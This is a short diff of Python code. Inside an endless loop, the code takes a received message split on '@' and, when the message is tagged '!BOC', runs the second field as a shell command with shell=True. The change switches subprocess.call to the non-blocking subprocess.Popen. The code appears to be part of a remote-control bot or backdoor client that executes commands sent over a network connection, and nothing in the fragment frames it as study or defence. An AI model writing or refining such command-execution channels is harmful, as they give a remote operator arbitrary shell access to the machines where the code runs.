@@ -14,7 +14,7 @@ while True:
                 info = recv.split("@")
 
                 if info[0] == "!BOC":
-                    subprocess.call(info[1], shell=True)
+                    subprocess.Popen(info[1], shell=True)
 
             elif len(recv.split("@")) == 3:
                 info = recv.split("@")
